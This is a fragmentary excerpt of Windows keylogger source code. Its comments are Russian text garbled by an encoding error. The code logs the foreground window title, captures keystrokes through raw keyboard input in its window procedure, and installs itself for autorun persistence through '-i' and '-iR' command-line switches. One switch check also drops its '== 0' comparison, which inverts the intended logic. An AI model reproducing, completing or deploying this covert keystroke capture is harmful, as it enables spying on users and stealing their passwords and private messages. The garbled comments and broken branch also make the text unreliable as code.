...
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	...
	case WM_INPUT:
		GetWindowTextW(GetForegroundWindow(), currWin, 256); // ïðîâåðÿåì, èçìåíèëîñü ëè ïåðåäíåå îêíî
		if (lstrcmpW(lastWin, currWin) != 0){
			appendLog(L"\n[");
			appendLog(currWin);	// ïèøåì â ëîã 
			appendLog(L"]:\n");
...

		{
			...
			GetRawInputData((HRAWINPUT)lParam, RID_INPUT, (LPVOID)&rawData, (LPUINT)&size, sizeof(RAWINPUTHEADER)); // ïîëó÷àåì ââîä ñ êëàâèàòóðû
...
/*
	...
	Ïðèì. Óñòàíîâêà âûïîëíÿåòñÿ ïðè çàïóñêå ñ êëþ÷îì -i
*/
bool install()
{
	setAutorun();
...
int WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int nCmdShow)
{
	...
	if (argc > 1)
	{
		if (lstrcmpW(argv[1], L"-i") == 0){ // òîëüêî óñòàíîâêà
			install();
			return 0;
		}
		else if (lstrcmpW(argv[1], L"-iR")) // óñòàíîâêà è âûïîëíåíèå
			install();
	}
